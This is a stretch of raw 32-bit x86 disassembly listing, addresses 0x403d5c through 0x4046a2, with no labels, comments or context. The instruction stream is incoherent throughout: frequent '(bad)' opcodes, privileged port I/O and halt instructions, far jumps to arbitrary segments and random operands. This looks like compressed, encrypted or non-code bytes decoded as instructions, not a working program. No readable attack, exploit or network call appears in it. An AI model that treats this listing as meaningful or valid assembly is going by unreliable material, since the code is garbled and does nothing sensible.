  403d5c:	outs   dx,DWORD PTR ds:[esi]
  403d5d:	in     eax,0xfe
  403d5f:	clc    
  403d60:	add    DWORD PTR [edx+0x71a3af1b],ebp
  403d66:	xchg   DWORD PTR [ebx],eax
  403d68:	cmp    bl,BYTE PTR [ecx-0x34]
  403d6b:	ret    0x3a88
  403d6e:	fisttp DWORD PTR [ebx+0x23b5ea94]
  403d74:	xchg   dl,ch
  403d76:	mov    ch,0x8d
  403d78:	adc    BYTE PTR [esi],ch
  403d7a:	jl     0x403dd7
	...
  403d90:	jnp    0x403d48
  403d92:	cmovle esp,DWORD PTR [esp+edx*4-0x6c823ae0]
  403d9a:	cmp    ecx,DWORD PTR [edi-0x18a69c9a]
  403da0:	push   esp
  403da1:	arpl   WORD PTR [ecx-0x77],bx
  403da4:	lock xchg BYTE PTR [edi-0x1de2172d],cl
  403dab:	pop    ecx
  403dac:	jo     0x403e03
  403dae:	and    dl,BYTE PTR [edx]
  403db0:	(bad)  
  403db1:	dec    ebp
  403db2:	push   0xffffffbd
  403db4:	jg     0x403de0
  403db6:	ret    0x5fbe
  403db9:	sub    ah,BYTE PTR [eax+eax*4-0x75]
  403dbd:	jb     0x403daf
  403dbf:	xchg   ebx,eax
  403dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dc1:	xchg   ebx,eax
  403dc2:	scas   eax,DWORD PTR es:[edi]
  403dc3:	repz dec esp
  403dc5:	push   esp
  403dc6:	out    0x6,al
  403dc8:	iret   
  403dc9:	sbb    cl,BYTE PTR [edx]
  403dcb:	test   DWORD PTR [ebx+esi*2],0x18f4f6f9
  403dd2:	pop    ebp
  403dd3:	adc    ebx,DWORD PTR [edi]
  403dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dd6:	mov    DWORD PTR [eax-0x3ae24171],edi
  403ddc:	into   
  403ddd:	xchg   edi,eax
  403dde:	loop   0x403db3
  403de0:	pop    es
  403de1:	sub    al,0x12
  403de3:	mov    edi,0xbef22aaf
  403de8:	sbb    DWORD PTR [eax],ebx
  403dea:	out    0x89,al
  403dec:	dec    edi
  403ded:	lods   eax,DWORD PTR ds:[esi]
  403dee:	xchg   DWORD PTR [esi],eax
  403df0:	dec    edx
  403df1:	ins    BYTE PTR es:[edi],dx
  403df2:	mov    al,ds:0xc4
	...
  403e07:	add    BYTE PTR [ebp-0x5971446d],bl
  403e0d:	bound  ebp,QWORD PTR [ecx-0x669d5b1a]
  403e13:	mov    al,bh
  403e15:	xchg   al,al
  403e17:	or     ebx,eax
  403e19:	fsubr  st(2),st
  403e1b:	pop    ecx
  403e1c:	enter  0xa253,0x11
  403e20:	(bad)  
  403e21:	dec    ebx
  403e22:	or     BYTE PTR [edx+0x38],ah
  403e25:	(bad)  
  403e27:	retf   0x6231
  403e2a:	icebp  
  403e2b:	je     0x403e18
  403e2d:	lea    ebp,[edx+0x4]
  403e30:	xchg   BYTE PTR [esi],bl
  403e32:	or     ebp,DWORD PTR [edi-0x1b37aaa5]
  403e38:	mov    dl,BYTE PTR [ecx-0x7d]
  403e3b:	inc    edx
  403e3c:	inc    edx
  403e3d:	push   ds
  403e3e:	sub    eax,DWORD PTR [eax+0x3a]
  403e41:	sub    eax,DWORD PTR [ebp-0x442b61a3]
  403e47:	test   eax,0x15e924f
  403e4c:	push   ecx
  403e4d:	push   ebx
  403e4e:	add    edx,ebp
  403e50:	aas    
  403e51:	sbb    dh,al
  403e53:	fcmovu st,st(1)
  403e55:	jno    0x403e4a
  403e57:	fcmovbe st,st(7)
  403e59:	pop    ss
  403e5a:	test   dh,dh
  403e5c:	pusha  
  403e5d:	retf   0xc756
  403e60:	mov    dl,dh
  403e62:	and    al,0x28
  403e64:	rcl    BYTE PTR [esi+0x2b02230b],1
  403e6a:	cmp    esp,eax
	...
  403e80:	icebp  
  403e81:	sbb    eax,0x90be33b
  403e86:	pop    ss
  403e87:	or     ebp,0xffffffde
  403e8a:	loopne 0x403e76
  403e8c:	jne    0x403ee1
  403e8e:	retf   
  403e8f:	fst    QWORD PTR [eax-0x463f7cb5]
  403e95:	sub    ch,BYTE PTR [ebx]
  403e97:	mov    bl,0xc1
  403e99:	sub    al,0x85
  403e9b:	gs (bad) 
  403e9d:	(bad)  
  403e9e:	sbb    dh,dl
  403ea0:	mov    ebp,0xcef54e91
  403ea5:	push   esp
  403ea6:	or     eax,0xf319d0ea
  403eab:	fcmovbe st,st(7)
  403ead:	jno    0x403ea0
  403eaf:	add    BYTE PTR [esi-0x18],al
  403eb2:	test   BYTE PTR [edx+ebx*2+0x67441cc0],dl
  403eb9:	nop
  403eba:	pop    esi
  403ebb:	sub    BYTE PTR [esi+ecx*2],ah
  403ebe:	add    DWORD PTR [ebx],eax
  403ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ec1:	pop    ss
  403ec2:	lock xor ebp,edi
  403ec5:	das    
  403ec6:	repnz xor edi,DWORD PTR [ebp-0x1bf07bf3]
  403ecd:	repnz test al,0xd8
  403ed0:	(bad)  ss:[ecx+eax*8]
  403ed4:	je     0x403e70
  403ed6:	or     ecx,edx
  403ed8:	scas   al,BYTE PTR es:[edi]
  403ed9:	out    0x3a,al
  403edb:	stc    
  403edc:	xchg   al,ch
  403ede:	cmp    bh,dl
  403ee0:	mov    al,ds:0xc8170c
	...
  403ef5:	add    BYTE PTR [eax],al
  403ef7:	add    BYTE PTR [esi+0x3f],ch
  403efa:	out    dx,eax
  403efb:	add    esp,ebx
  403efd:	or     cl,0xc3
  403f00:	sbb    DWORD PTR [eax+0x1f8c8bd1],edx
  403f06:	repnz and ecx,DWORD PTR [edi+0x698df01f]
  403f0d:	xchg   ebx,eax
  403f0e:	out    dx,al
  403f0f:	int    0x84
  403f11:	xor    DWORD PTR [edx],ecx
  403f13:	inc    esi
  403f14:	cdq    
  403f15:	push   ecx
  403f16:	enter  0xf605,0x4f
  403f1a:	cmp    ebx,0x76
  403f1d:	call   0xe7b7384c
  403f22:	test   BYTE PTR [edx+ebp*8-0x9c8f0be],dl
  403f29:	(bad)  
  403f2a:	pop    esi
  403f2b:	cmp    ah,ah
  403f2d:	dec    esi
  403f2e:	add    DWORD PTR [ebx],eax
  403f30:	adc    eax,0xef33f018
  403f35:	das    
  403f36:	repnz xor ebp,ebp
  403f39:	or     eax,0xb68c0f84
  403f3e:	push   cs
  403f3f:	aad    0x98
  403f41:	cmp    DWORD PTR [ecx+0xc],eax
  403f44:	dec    ebp
  403f45:	in     eax,dx
  403f46:	add    BYTE PTR [ebx],al
  403f48:	push   esi
  403f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f4a:	mov    ch,0x33
  403f4c:	jne    0x403f9d
  403f4e:	mov    bl,0x33
  403f50:	jbe    0x403f13
  403f52:	lahf   
  403f53:	pop    ds
  403f54:	jns    0x403f78
  403f56:	push   ebp
  403f57:	inc    ebp
  403f58:	(bad)  
  403f59:	jecxz  0x403f45
  403f5b:	rol    BYTE PTR [eax],0x0
	...
  403f6e:	add    BYTE PTR [eax],al
  403f70:	dec    edi
  403f71:	and    cl,BYTE PTR [ecx+ebx*8]
  403f74:	pop    es
  403f75:	(bad)  
  403f78:	outs   dx,DWORD PTR ds:[esi]
  403f79:	xlat   BYTE PTR ds:[ebx]
  403f7a:	cld    
  403f7b:	clc    
  403f7c:	adc    DWORD PTR [edx-0x30dafaf8],edi
  403f82:	bound  eax,QWORD PTR [ebx]
  403f84:	retf   0xca29
  403f87:	rcl    BYTE PTR [ecx+0x278bcc2e],0x3f
  403f8e:	mov    bl,0x23
  403f90:	adc    eax,0xf88db43f
  403f95:	sub    dh,BYTE PTR [ebx+0xc99fba3]
  403f9b:	push   esi
  403f9c:	xchg   esp,eax
  403f9d:	ins    BYTE PTR es:[edi],dx
  403f9e:	int    0x9
  403fa0:	(bad)  
  403fa1:	jge    0x403f27
  403fa3:	clc    
  403fa4:	mov    edi,0x9ffaeb27
  403fa9:	xor    eax,0x54938c81
  403fae:	or     ch,BYTE PTR [edi+0x73]
  403fb1:	cs dec ebp
  403fb3:	sbb    al,0xcd
  403fb5:	in     al,dx
  403fb6:	or     eax,0xb2a6d603
  403fbb:	xor    eax,ebp
  403fbd:	mov    ?,WORD PTR [ebx+esi*1+0x1f90b8b6]
  403fc4:	push   es
  403fc5:	and    dl,0x8c
  403fc8:	(bad)  
  403fc9:	xchg   esp,eax
  403fca:	dec    edi
  403fcb:	hlt    
  403fcc:	int3   
  403fcd:	push   edi
  403fce:	std    
  403fcf:	add    dh,BYTE PTR [ebp+0xf3980f]
	...
  403fe5:	add    BYTE PTR [eax],al
  403fe7:	add    BYTE PTR [ebp+0x10899a67],dl
  403fed:	fwait
  403fee:	and    edi,ebp
  403ff0:	test   DWORD PTR [ebx],esp
  403ff2:	loop   0x404031
  403ff4:	mov    al,ds:0x8f00a155
  403ff9:	push   edi
  403ffa:	push   0xffffffbb
  403ffc:	lahf   
  403ffd:	sbb    eax,0x811bc12
  404002:	inc    BYTE PTR [edx+eiz*2-0x45fc995b]
  404009:	je     0x40402b
  40400b:	ret    0x9797
  40400e:	adc    DWORD PTR [ebx-0xcb598bc],ecx
  404014:	xor    eax,0x6e076d11
  404019:	mov    ch,0x44
  40401b:	sub    DWORD PTR [edi+0x4dc4ddd2],ecx
  404021:	test   dl,ah
  404023:	leave  
  404024:	pop    es
  404025:	push   ds
  404026:	sar    BYTE PTR [ebx-0x67abe2a1],cl
  40402c:	stos   DWORD PTR es:[edi],eax
  40402d:	nop
  40402e:	leave  
  40402f:	mov    al,ds:0xfb979701
  404034:	int3   
  404035:	push   esi
  404036:	(bad)  
  404037:	add    dl,ch
  404039:	push   cs
  40403a:	clc    
  40403b:	repnz in eax,0x66
  40403e:	jmp    0x1aaa:0x2d9b0888
  404045:	clc    
  404046:	loope  0x404085
  404048:	mov    BYTE PTR [ebp-0x5f],dl
  40404b:	inc    DWORD PTR [eax]
	...
  40405d:	add    BYTE PTR [eax],al
  40405f:	add    BYTE PTR [esi+0x7fba7a57],cl
  404065:	sbb    eax,0x809bbf2
  40406a:	or     dh,bl
  40406c:	and    BYTE PTR [ebx-0x2a],dl
  40406f:	and    cl,BYTE PTR [edi-0x3257e736]
  404075:	mov    cs,WORD PTR [ebx]
  404077:	mov    ecx,0x923b1c06
  40407c:	sahf   
  40407d:	sbb    al,0x85
  40407f:	pop    ebp
  404080:	xchg   edx,eax
  404081:	mov    ah,0x43
  404083:	inc    edx
  404084:	xor    DWORD PTR [esi+0x5450dd46],edx
  40408a:	sbb    dl,ch
  40408c:	inc    ebp
  40408d:	push   cs
  40408e:	repnz mov edx,0x74f16627
  404094:	sti    
  404095:	cmp    DWORD PTR [eax-0x63],0xb70ae2e2
  40409c:	addr16 push ebp
  40409e:	retf   
  40409f:	test   BYTE PTR [esi+0x3e40833b],0x1c
  4040a6:	cmp    eax,DWORD PTR [edx+0x4]
  4040a9:	sbb    DWORD PTR [edi],ecx
  4040ab:	das    
  4040ac:	jns    0x4040ab
  4040ae:	pop    ds
  4040af:	jmp    0x9723:0x29c96869
  4040b6:	retf   
  4040b7:	jb     0x40408f
  4040b9:	gs icebp 
  4040bb:	fcmovbe st,st(7)
  4040bd:	setl   dh
  4040c0:	inc    ebp
  4040c1:	jp     0x40406c
  4040c3:	adc    eax,DWORD PTR [eax]
	...
  4040d5:	add    BYTE PTR [eax],al
  4040d7:	add    BYTE PTR [esi-0x79d43676],cl
  4040dd:	xchg   ebp,eax
  4040de:	fsub   DWORD PTR [edx+0x37]
  4040e1:	repz mov dx,0x1025
  4040e6:	test   dh,dh
  4040e8:	bound  esp,QWORD PTR [edi+eiz*8-0x4b]
  4040ec:	(bad)  
  4040ed:	rol    BYTE PTR [eax+ebp*4],cl
  4040f0:	iret   
  4040f1:	test   BYTE PTR [ebx],cl
  4040f3:	mov    ds:0x3b1f15,eax
  4040f8:	int    0x23
  4040fa:	lock lea ebx,[ecx-0x79]
  4040fe:	or     eax,0xb942d1d
  404103:	pop    esi
  404104:	mov    ebp,0xb617cb56
  404109:	ds cmp ecx,0xffffffb6
  40410d:	fstp   TBYTE PTR [edx]
  40410f:	sti    
  404110:	sub    BYTE PTR [edi+ecx*1],dl
  404113:	cmp    DWORD PTR [ebp+0x44],eax
  404116:	rol    DWORD PTR [ebx],1
  404118:	mov    bl,0x34
  40411a:	enter  0x71c0,0x94
  40411e:	retf   
  40411f:	mov    edi,esi
  404121:	and    esi,eax
  404123:	xor    ebx,ebp
  404125:	sbb    DWORD PTR [edi+edx*1-0x192d0230],ebx
  40412c:	iretw  
  40412e:	cmp    cl,al
  404130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404131:	mov    ecx,DWORD PTR [ebx]
  404133:	shr    BYTE PTR [esi+0x46fb3ae0],1
  404139:	fild   DWORD PTR [esp+ecx*4+0x0]
	...
  404150:	sub    bl,ch
  404152:	jae    0x4040f6
  404154:	pop    edx
  404155:	xchg   esp,eax
  404156:	inc    esi
  404157:	cmp    al,0x74
  404159:	push   ebp
  40415a:	sbb    BYTE PTR [ebx],al
  40415c:	pop    edi
  40415d:	or     esi,edx
  40415f:	xor    ebp,DWORD PTR [ebp+0x23]
  404162:	lock lea ebx,[ecx-0x36a99279]
  404169:	push   esp
  40416a:	or     ebx,DWORD PTR [esi-0x3]
  40416d:	push   ebp
  40416e:	retf   
  40416f:	pop    ss
  404170:	out    0x3d,al
  404172:	mov    bh,0xff
  404174:	cli    
  404175:	out    0xf6,eax
  404177:	xor    ebx,edi
  404179:	mov    esi,ebx
  40417b:	xor    ebp,esp
  40417d:	sbb    DWORD PTR [edi+eax*1-0xbdfc94f],ecx
  404184:	mov    WORD PTR [esi],gs
  404186:	cmc    
  404187:	ror    ah,0x38
  40418a:	or     bl,al
  40418c:	add    ebx,DWORD PTR [edx-0x44]
  40418f:	(bad)  
  404190:	mov    ebx,0xb40bb21d
  404195:	sbb    eax,0x4a008db0
  40419a:	test   bh,bh
  40419c:	jbe    0x40420c
  40419e:	or     DWORD PTR [esi+0x78],edx
  4041a1:	in     al,dx
  4041a2:	enter  0x8f0a,0xdb
  4041a6:	jnp    0x4041a7
  4041a8:	mov    ecx,DWORD PTR [edi]
  4041aa:	mov    esp,0xb1238733
  4041af:	xor    esi,DWORD PTR [ecx+esi*4-0x71]
  4041b3:	sldt   WORD PTR [eax]
	...
  4041c6:	add    BYTE PTR [eax],al
  4041c8:	sub    ecx,DWORD PTR [ebx-0x79]
  4041cb:	stos   DWORD PTR es:[edi],eax
  4041cc:	(bad)  
  4041cd:	jg     0x4041c3
  4041cf:	ror    BYTE PTR [ebp+0x27],0x8
  4041d3:	retf   0xbf1b
  4041d6:	mov    esp,0xb47b53ff
  4041db:	or     eax,DWORD PTR [ebp+0x7b]
  4041de:	mov    dl,0x8d
  4041e0:	and    BYTE PTR [edi],dh
  4041e2:	repnz lahf 
  4041e4:	pop    ds
  4041e5:	bound  ecx,QWORD PTR [eax]
  4041e7:	pop    esi
  4041e8:	cwde   
  4041e9:	ins    BYTE PTR es:[edi],dx
  4041ea:	enter  0x8f15,0x84
  4041ee:	jl     0x4041ef
  4041f0:	and    esi,DWORD PTR [edi-0x44]
  4041f3:	xor    edx,DWORD PTR [esi]
  4041f5:	and    esi,DWORD PTR [eax+0x77b91533]
  4041fb:	pop    es
  4041fc:	iret   
  4041fd:	in     al,0x4f
  4041ff:	gs (bad) 
  404201:	out    dx,eax
  404202:	cli    
  404203:	ror    ah,0x37
  404206:	or     bl,al
  404208:	xor    esp,DWORD PTR [edi]
  40420a:	mov    ebx,0xb1daebff
  40420f:	or     esp,esp
  404211:	xchg   esp,eax
  404212:	adc    ch,BYTE PTR [edi-0x6a01f6f7]
  404218:	rcl    BYTE PTR [eax-0x6f9df892],0xa0
  40421f:	(bad)  
  404220:	xchg   esi,eax
  404221:	xchg   ebx,eax
  404222:	xchg   ecx,eax
  404223:	jae    0x4041e0
  404225:	pop    ds
  404226:	mov    dh,0xb3
  404228:	jg     0x404245
  40422a:	jmp    0x0:0xad
	...
  40423d:	add    BYTE PTR [eax],al
  40423f:	add    BYTE PTR [edi+0x1c],bl
  404242:	push   esp
  404243:	adc    BYTE PTR [ebx-0x645c6a5f],0x93
  40424a:	daa    
  40424b:	fmul   st(4),st
  40424d:	push   ebp
  40424e:	out    dx,al
  40424f:	push   es
  404250:	push   esi
  404251:	fild   WORD PTR [ebp-0x4de07c4d]
  404257:	stos   DWORD PTR es:[edi],eax
  404258:	xchg   DWORD PTR ds:0x1adb2,ebx
  40425e:	(bad)  
  404260:	leave  
  404261:	sbb    BYTE PTR [edi+eax*1-0x3e],ch
  404265:	cwde   
  404266:	and    bh,al
  404268:	adc    DWORD PTR [ebx+0x1f537348],0x1a7fb35e
  404272:	jmp    0x9388:0x7c1d7fae
  404279:	iret   
  40427a:	mov    bh,0x5b
  40427c:	mov    ds:0x4ce3a793,eax
  404281:	push   esp
  404282:	out    dx,eax
  404283:	push   es
  404284:	dec    edi
  404285:	fild   QWORD PTR ds:0xd21f1bb3
  40428b:	lods   al,BYTE PTR ds:[esi]
  40428c:	xchg   DWORD PTR [edx+edx*8],ebx
  40428f:	scas   al,BYTE PTR es:[edi]
  404290:	sbb    DWORD PTR [eax],ecx
  404292:	(bad)  
  404293:	mov    ds:0x70f6fea,eax
  404298:	bound  esp,QWORD PTR [eax+0x20]
  40429b:	mov    BYTE PTR [esi+0x5f190893],0x1f
  4042a2:	imul   esi
	...
  4042b8:	push   ds
  4042b9:	arpl   bx,si
  4042bb:	repnz sub DWORD PTR [ebx-0x10],esp
  4042bf:	ins    BYTE PTR es:[edi],dx
  4042c0:	push   ebx
  4042c1:	(bad)  
  4042c2:	sbb    al,0x2a
  4042c4:	xchg   ecx,eax
  4042c5:	repz or bl,BYTE PTR [edi]
  4042c8:	nop
  4042c9:	push   ebp
  4042ca:	leave  
  4042cb:	not    BYTE PTR [edx-0x14148b6]
  4042d1:	push   ds
  4042d2:	idiv   edx
  4042d4:	test   DWORD PTR [edx+0x10f1faf1],0x85310694
  4042de:	add    BYTE PTR [edi],ch
  4042e0:	mov    edi,DWORD PTR [esi-0x77ad57c4]
  4042e6:	or     esi,DWORD PTR [eax-0x7908e202]
  4042ec:	ds (bad) 
  4042ef:	repnz and ah,BYTE PTR [edx-0xf]
  4042f3:	adc    edx,DWORD PTR fs:[esi+0x25baef8a]
  4042fa:	or     ebp,DWORD PTR [edi-0x1837ac81]
  404300:	mov    dl,BYTE PTR [ecx-0x49]
  404303:	push   esi
  404304:	(bad)  
  404305:	sbb    eax,0x89f11af7
  40430a:	lock cli 
  40430c:	jmp    0x3224:0x34d69c0f
  404313:	je     0x4042a7
  404315:	(bad)  
  404316:	and    al,0x28
  404318:	dec    ecx
  404319:	mov    ecx,DWORD PTR [ebx]
  40431b:	cmp    DWORD PTR [eax],eax
	...
  40432d:	add    BYTE PTR [eax],al
  40432f:	add    BYTE PTR [esi-0x21e108e3],bl
  404335:	popa   
  404336:	repz loop 0x404372
  404339:	(bad)  
  40433a:	lock pop esp
  40433c:	or     DWORD PTR [ebp+0x3a9700b3],0x22
  404343:	add    esp,DWORD PTR [ebx]
  404345:	sbb    cl,al
  404347:	shl    edx,0x96
  40434a:	ret    0xf2bf
  40434d:	jecxz  0x404345
  40434f:	push   DWORD PTR [esi-0x10]
  404352:	add    bh,cl
  404354:	jbe    0x404344
  404356:	test   BYTE PTR [edx+eax*8-0x317924fe],bl
  40435d:	xchg   edi,eax
  40435e:	push   esi
  40435f:	and    al,0xe4
  404361:	push   edi
  404362:	sbb    eax,0x759fec03
  404367:	or     BYTE PTR [esp+ecx*4-0x6d56a0f7],dh
  40436e:	inc    edi
  40436f:	or     BYTE PTR [esp+edi*4-0x1b9f00fc],ah
  404376:	test   BYTE PTR [esi-0x4b],dh
  404379:	xchg   ebx,eax
  40437a:	or     DWORD PTR [edi],0x5af6e31f
  404380:	lods   al,BYTE PTR ds:[esi]
  404381:	iret   
  404382:	push   eax
  404383:	pop    edi
  404384:	xchg   ebx,eax
  404385:	fxch   st(1)
  404387:	or     al,0x75
  404389:	mov    BYTE PTR [ebx-0xfb30914],0x57
  404390:	sbb    ecx,eax
  404392:	iret   
  404393:	inc    ebp
	...
  4043a8:	mov    cl,0x98
  4043aa:	or     BYTE PTR [eax],al
  4043ac:	xor    eax,0xe20c7ce4
  4043b1:	aad    0xf0
  4043b3:	(bad)  
  4043b4:	sub    cl,dl
  4043b6:	test   DWORD PTR [ecx+0x25],eax
  4043b9:	xchg   edx,eax
  4043ba:	sub    eax,DWORD PTR [ebp+0x5a]
  4043bd:	dec    esp
  4043be:	or     eax,0x8d1c044
  4043c3:	mov    DWORD PTR [esi+0x28c7e6dd],edi
  4043c9:	pop    ecx
  4043ca:	test   DWORD PTR [ecx-0x74],eax
  4043cd:	sub    edi,DWORD PTR [ecx-0x3e5cb924]
  4043d3:	add    eax,0x4ba848
  4043d8:	jp     0x4043e1
  4043da:	std    
  4043db:	psrlq  mm5,QWORD PTR [edi]
  4043de:	pop    ebx
  4043df:	lea    ecx,[ebp+0x2b]
  4043e2:	mov    ebx,0x93e9bee1
  4043e7:	sbb    al,0x7
  4043e9:	js     0x4043df
  4043eb:	add    dl,BYTE PTR [ecx+0x47]
  4043ee:	adc    eax,0x77673440
  4043f3:	inc    ecx
  4043f4:	mov    WORD PTR [ebx-0x6c],?
  4043f7:	inc    eax
  4043f8:	test   eax,0x5183b7dd
  4043fd:	out    0x4a,eax
  4043ff:	call   0x4b6ed4
  404404:	js     0xdd5f84ae
  40440a:	jae    0x404469
	...
  404420:	test   BYTE PTR [edi+0x711740cc],ch
  404426:	hlt    
  404427:	add    dl,cl
  404429:	adc    DWORD PTR [eax+ebp*2-0x28],ebx
  40442d:	test   al,0x4a
  40442f:	add    BYTE PTR [ebp+edx*1-0x549c1afe],bh
  404436:	or     bl,BYTE PTR [ebp+0x58]
  404439:	ins    BYTE PTR es:[edi],dx
  40443a:	mov    WORD PTR [ecx+eax*1-0x13],ss
  40443e:	or     al,BYTE PTR [eax+0x75f0d70f]
  404444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404445:	scas   al,BYTE PTR es:[edi]
  404446:	xchg   esp,eax
  404447:	or     al,al
  404449:	daa    
  40444a:	mov    esp,DWORD PTR [ebx+0x4aa918]
  404450:	mov    esi,gs
  404452:	and    dh,dh
  404454:	xor    al,0xb7
  404456:	or     eax,DWORD PTR [eax]
  404458:	mov    WORD PTR [edx+ebp*2+0x161c13bb],ss
  40445f:	pushf  
  404460:	mov    fs,WORD PTR [eax+0x92f83eb]
  404466:	push   esp
  404467:	inc    edx
  404468:	mov    WORD PTR [edx+eiz*4-0x53f005d5],ss
  40446f:	jmp    DWORD PTR [ecx*4+0x678c03e1]
  404476:	adc    edi,DWORD PTR [eax-0x467413]
  40447c:	(bad)
  40447f:	or     DWORD PTR [ebp-0x6c],0x1968
	...
  404496:	add    BYTE PTR [eax],al
  404498:	adc    BYTE PTR [edx],cl
  40449a:	and    BYTE PTR [esp+eiz*4],al
  40449d:	mov    esp,0xf58c03e1
  4044a2:	and    BYTE PTR [ecx+0x196a944d],al
  4044a8:	dec    eax
  4044a9:	or     DWORD PTR [eax],esp
  4044ab:	add    al,0x7
  4044ad:	mov    bh,BYTE PTR [ecx]
  4044af:	or     DWORD PTR [ebp-0x6c],0x4e9bbbe6
  4044b6:	out    dx,al
  4044b7:	mov    esp,0x4554d42f
  4044bc:	mov    WORD PTR ds:0xd50147d4,cs
  4044c2:	loope  0x404540
  4044c4:	cdq    
  4044c5:	int3   
  4044c6:	ins    BYTE PTR es:[edi],dx
  4044c7:	inc    ebp
  4044c8:	mov    ebp,?
  4044ca:	adc    al,0x81
  4044cc:	int    0x94
  4044ce:	jp     0x4044e9
  4044d0:	mov    esp,0x9b03a009
  4044d5:	dec    esp
  4044d6:	out    dx,al
  4044d7:	mov    ecx,0x4554c7ef
  4044dc:	mov    WORD PTR ds:0xd50153d4,cs
  4044e2:	loope  0x4044fd
  4044e4:	sbb    BYTE PTR [ebx],0x8
  4044e7:	mov    esp,0x5c48ac7f
  4044ec:	rcl    DWORD PTR [eax+eiz*8-0x8e51465],1
  4044f3:	ret    0xbb59
  4044f6:	shr    DWORD PTR [ebx],0x8c
  4044f9:	xchg   esp,eax
  4044fa:	pop    ebp
  4044fb:	bound  eax,QWORD PTR [eax]
	...
  40450d:	add    BYTE PTR [eax],al
  40450f:	add    BYTE PTR [edi+edx*1],ch
  404512:	int3   
  404513:	add    DWORD PTR [ecx+0x1c],esp
  404516:	idiv   esi
  404518:	cmp    cl,BYTE PTR [edi]
  40451a:	or     al,0x24
  40451c:	add    al,0x9
  40451e:	dec    ecx
  40451f:	jmp    0x8205c57a
  404524:	or     al,0xd5
  404526:	or     dh,ch
  404528:	pop    es
  404529:	mov    eax,edx
  40452b:	pusha  
  40452c:	mov    ecx,DWORD PTR [ecx-0x64]
  40452f:	pop    esp
  404530:	push   eax
  404531:	xchg   esp,eax
  404532:	sbb    ebp,0x2884fbcc
  404538:	nop
  404539:	aad    0x7d
  40453b:	xchg   esp,eax
  40453c:	xor    BYTE PTR [edi+esi*8-0x52],dl
  404540:	jmp    0x490a:0x17740c0e
  404547:	jmp    0x1dc5c652
  40454c:	add    dl,ah
  40454e:	or     dl,bl
  404550:	xchg   ebx,eax
  404551:	pop    es
  404552:	push   esp
  404553:	ja     0x40451d
  404555:	xchg   esp,eax
  404556:	cmp    edx,ebp
  404558:	or     al,0xc1
  40455a:	xchg   BYTE PTR [eax],ch
  40455c:	mov    BYTE PTR [ebp-0x36],ah
  40455f:	cwde   
  404560:	dec    edi
  404561:	or     al,0xc
  404563:	je     0x404560
  404565:	or     cl,BYTE PTR [ecx-0x17]
  404568:	rcr    BYTE PTR [edi-0x2b639d22],1
  40456e:	test   DWORD PTR [eax+0x3d0d8f],ebp
	...
  404588:	loope  0x40459e
  40458a:	dec    ecx
  40458b:	add    BYTE PTR [esi-0xb72b0dc],bl
  404591:	xchg   ebp,eax
  404592:	div    DWORD PTR ds:0x4914f9
  404598:	call   0x85c5:0xe0fff4cc
  40459f:	inc    ecx
  4045a0:	cmc    
  4045a1:	call   0xfff6:0xf95cf84d
  4045a8:	mov    bl,BYTE PTR [esi-0x1d4d7422]
  4045ae:	fldenv [ebx]
  4045b0:	mov    bl,0x36
  4045b2:	pop    esp
  4045b3:	cld    
  4045b4:	out    dx,al
  4045b5:	push   ebx
  4045b6:	or     eax,DWORD PTR [eax+ebx*2]
  4045b9:	lods   al,BYTE PTR ds:[esi]
  4045ba:	test   DWORD PTR [ecx-0x4b],eax
  4045bd:	xchg   esp,eax
  4045be:	dec    ebp
  4045bf:	clc    
  4045c0:	mov    al,0xe
  4045c2:	jno    0x404546
  4045c4:	jg     0x4045ad
  4045c6:	jl     0x4045c4
  4045c8:	cmp    dl,cl
  4045ca:	lock mov DWORD PTR [eax-0x1c],ebp
  4045ce:	enter  0xbbc6,0x9c
  4045d2:	test   BYTE PTR [ebx+0x5cb55d6],0xa6
  4045d9:	dec    ebp
  4045da:	dec    ecx
  4045db:	jne    0x404616
  4045dd:	lods   eax,DWORD PTR ds:[esi]
  4045de:	in     al,0xff
  4045e0:	sbb    ah,bh
  4045e2:	add    dh,0xee
  4045e5:	aas    
  4045e6:	cmp    eax,DWORD PTR [ebp+0x9]
  4045e9:	and    ecx,ecx
  4045eb:	add    eax,DWORD PTR [eax]
	...
  4045fd:	add    BYTE PTR [eax],al
  4045ff:	add    BYTE PTR [ecx-0x66],dh
  404602:	cld    
  404603:	lea    esi,[eax+edx*4-0x6e22baf5]
  40460a:	test   eax,0xf77acceb
  40460f:	jne    0x4045fa
  404611:	xchg   edi,eax
  404612:	dec    ebp
  404613:	clc    
  404614:	mov    WORD PTR [edi+eiz*1+0x6714dfc],?
  40461b:	mov    esi,DWORD PTR [edx]
  40461d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40461e:	mov    ecx,0x8304fc1
  404623:	fmul   st,st(5)
  404625:	fcomp  st(2)
  404627:	mov    ecx,0xffa56a28
  40462c:	pop    es
  40462d:	push   0x71
  40462f:	push   ebp
  404630:	or     BYTE PTR [esi],ah
  404632:	dec    esi
  404633:	cld    
  404634:	scas   eax,DWORD PTR es:[edi]
  404635:	pop    edx
  404636:	jmp    0x9adce00
  40463b:	add    al,0x1
  40463d:	out    0x74,eax
  40463f:	inc    ecx
  404640:	mov    WORD PTR [esi],gs
  404642:	dec    esi
  404643:	clc    
  404644:	mov    DWORD PTR [edi+0x78],edi
  404647:	sbb    ecx,DWORD PTR [ebx]
  404649:	sub    bh,BYTE PTR [esi]
  40464b:	cld    
  40464c:	add    ebp,DWORD PTR [eax-0x5c]
  40464f:	mov    DWORD PTR [ecx+0x37],ecx
  404652:	retf   0xa2c6
  404655:	mov    dh,0xa5
  404657:	mov    edi,DWORD PTR [edi-0x70fa3815]
  40465d:	repz dec ecx
  40465f:	jne    0x404638
  404661:	adc    edx,DWORD PTR [edi+0xff]
	...
  404677:	add    BYTE PTR [ebx+0x7c66fe1],ah
  40467d:	add    bh,al
  40467f:	inc    esp
  404680:	nop
  404681:	cmp    eax,0xa89003c9
  404686:	lahf   
  404687:	mov    cs,ebp
  404689:	sub    eax,0x31744508
  40468e:	ffree  st(1)
  404690:	out    dx,al
  404691:	jecxz  0x404636
  404693:	jne    0x4046fd
  404695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404696:	dec    esi
  404697:	clc    
  404698:	adc    eax,0x52c1a721
  40469d:	dec    eax
  40469e:	jo     0x40469e
  4046a0:	pop    es
  4046a1:	xchg   ebp,eax
  4046a2:	push   edx
